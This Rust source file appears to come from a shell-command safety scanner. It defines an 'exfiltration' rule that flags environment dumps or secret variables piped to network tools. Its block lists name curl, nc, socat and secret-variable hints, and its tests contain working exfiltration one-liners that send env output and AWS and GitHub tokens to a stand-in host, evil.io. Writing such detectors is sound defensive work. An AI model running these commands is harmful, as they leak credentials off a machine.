use crate::analysis::Flag;
use crate::config::{NoConfig, Shared};
use crate::model::{Detail, Verdict};
use crate::parser::{Command, Pipeline};
use crate::register_flag;

/// Commands that dump the whole environment.
const ENV_DUMPS: &[&str] = &["env", "printenv", "set", "export"];
/// Sinks that push their stdin to a remote host.
const NET_SINKS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat", "telnet"];
/// Substrings of secret-bearing variable names.
const SECRET_HINTS: &[&str] = &[
    "SECRET",
    "TOKEN",
    "PASSWORD",
    "PASSWD",
    "APIKEY",
    "API_KEY",
    "ACCESS_KEY",
    "PRIVATE_KEY",
    "CREDENTIAL",
    "AWS_",
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "NPM_TOKEN",
];

fn body_carries_secrets(c: &Command) -> bool {
    c.args.iter().any(|w| {
        let t = &w.text;
        t.contains("$(env")
            || t.contains("$(printenv")
            || t.contains("`env")
            || SECRET_HINTS
                .iter()
                .any(|s| t.contains(&format!("${s}")) || t.contains(&format!("${{{s}")))
    })
}

pub struct Exfiltration {
    shared: Shared,
}

fn dead(what: String, span: crate::model::Span) -> Verdict {
    Verdict::Dead(
        Detail::new(what, "Secrets or your entire environment are shipped off this machine, which is how tokens and keys get stolen.")
            .fix("Do not run this. If you must, cut your network connection and read every URL first.")
            .at(span),
    )
}

impl Flag for Exfiltration {
    fn visit_pipeline(&mut self, p: &Pipeline) -> Verdict {
        let dumps_at = p
            .stages
            .iter()
            .position(|c| ENV_DUMPS.contains(&c.name.as_str()));
        let Some(i) = dumps_at else {
            return Verdict::Ignore;
        };
        let to_net = p.stages[i + 1..]
            .iter()
            .any(|c| NET_SINKS.contains(&c.name.as_str()));
        if to_net {
            return dead(
                format!(
                    "pipes `{}` (your whole environment) to the network",
                    p.stages[i].name
                ),
                p.span.clone(),
            );
        }
        Verdict::Ignore
    }

    fn visit_command(&mut self, c: &Command) -> Verdict {
        let is_sink = self.shared.is_network(&c.name) || NET_SINKS.contains(&c.name.as_str());
        if is_sink && c.urls().next().is_some() && body_carries_secrets(c) {
            return dead(
                format!("sends secrets to the network via `{}`", c.name),
                c.span.clone(),
            );
        }
        Verdict::Ignore
    }
}

register_flag! {
    id: "exfiltration",
    kind: Dead,
    category: Sensitive,
    description: "Sends environment variables or secrets to the network (env | curl, curl -d \"$TOKEN\")",
    weight: 5,
    config: NoConfig,
    build: |_cfg, shared| Exfiltration { shared: shared.clone() },
}

#[cfg(test)]
mod tests {
    use super::super::testing::*;
    use crate::model::FlagKind;

    #[test]
    fn detects_env_and_secret_exfiltration() {
        assert_eq!(
            kind(
                "exfiltration",
                "env | curl -s -X POST -d @- https://evil.io/c"
            ),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind("exfiltration", "printenv | nc evil.io 9001"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "exfiltration",
                "curl -s -d \"key=$AWS_SECRET_ACCESS_KEY\" https://evil.io/c"
            ),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "exfiltration",
                "curl -s -d \"tok=$(printenv GITHUB_TOKEN)\" https://evil.io"
            ),
            Some(FlagKind::Dead)
        );
        assert!(!fires("exfiltration", "env | grep PATH"));
        assert!(!fires("exfiltration", "curl -fsSL https://x.io/i -o i"));
    }
}
